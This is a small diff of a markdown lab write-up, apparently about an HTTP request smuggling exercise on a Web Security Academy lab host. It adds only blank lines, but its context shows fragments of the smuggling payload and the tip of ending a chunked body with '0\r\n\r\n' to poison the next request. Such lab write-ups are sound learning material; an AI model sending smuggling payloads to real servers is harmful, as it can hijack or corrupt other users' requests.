@@ -217,6 +217,7 @@ We will send the request with the normal content length with the payload poisoni
 also do not forget `0\r\n\r\n` in order to tell the back end that request ends, and poison with the next request.
 
 to solve the lab this is the payload i used : 
+
     POST / HTTP/1.1
     Host: 0ae8001803718feb818975b600c900da.web-security-academy.net
     Content-Type: application/x-www-form-urlencoded
@@ -229,6 +230,7 @@ to solve the lab this is the payload i used :
     X-Ignore: x
 
 and the normal request :
+
     POST / HTTP/1.1
     Host: 0ae8001803718feb818975b600c900da.web-security-academy.net
     Content-Type: application/x-www-form-urlencoded
